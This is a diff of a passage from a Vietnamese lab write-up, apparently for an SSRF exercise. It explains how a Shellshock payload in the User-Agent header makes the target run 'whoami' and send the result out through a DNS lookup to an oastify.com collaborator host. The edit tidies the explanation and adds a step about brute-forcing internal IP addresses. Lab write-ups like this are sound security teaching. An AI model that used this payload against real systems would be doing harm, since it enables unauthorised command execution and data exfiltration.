@@ -132,10 +132,12 @@ Chuyển sang tìm kiếm điểm khai thác ssrf lấy os user name, em sử d�
 Payload shellshock
 `() { :; }; /usr/bin/nslookup $(whoami).v0w7km5k6gzs3hgzx2kjx59yrpxfl4.oastify.com`
 
-Bash shell coi bộ dấu () { :; }; như là một khai báo hàm, và shell sẽ "đánh giá" chức năng của hàm đó. Tuy nhiên nó cũng đánh giá các chuỗi còn lại, khiến shell vô tình thực thi đoạn code độc hại phía sau. (lưu ý rằng nếu ko có định nghĩa hàm thì shell sẽ không đánh giá và -> không thực thi lệnh độc hại chèn vào như trên.
-vậy payload sẽ khiến shell xử lý chuỗi user-agent theo kiểu khác, nó sẽ thực hiện câu lệnh phía sau rồi lấy kết quả trả về chứ không lấy trực tiếp chuỗi. Và điều đó sẽ khiến máy nạn nhân gửi 1 request nslookup chứa kết quả lệnh `whoami`
+Bash shell coi bộ dấu () { :; }; như là một khai báo hàm, và shell sẽ "đánh giá" chức năng của hàm đó. Tuy nhiên nó cũng đánh giá các chuỗi còn lại, khiến shell vô tình thực thi đoạn code độc hại phía sau. (lưu ý rằng nếu ko có định nghĩa hàm thì shell sẽ không "đánh giá" và -> không thực thi lệnh độc hại chèn vào như trên.)
 
-Request DNS gửi tới máy chủ ta kèm theo username
+Vậy payload sẽ khiến shell xử lý chuỗi user-agent theo kiểu khác, nó sẽ thực hiện câu lệnh phía sau rồi lấy kết quả trả về chứ không lấy trực tiếp chuỗi. Và điều đó sẽ khiến máy nạn nhân gửi 1 request nslookup chứa kết quả lệnh `whoami`
+
+Brute-force địa chỉ IP với request có user-agent chứa giá trị trên, ta nhận được request DNS gửi tới máy chủ ta kèm theo username
+
 >![](https://i.imgur.com/uwYGdlL.png)
 
 
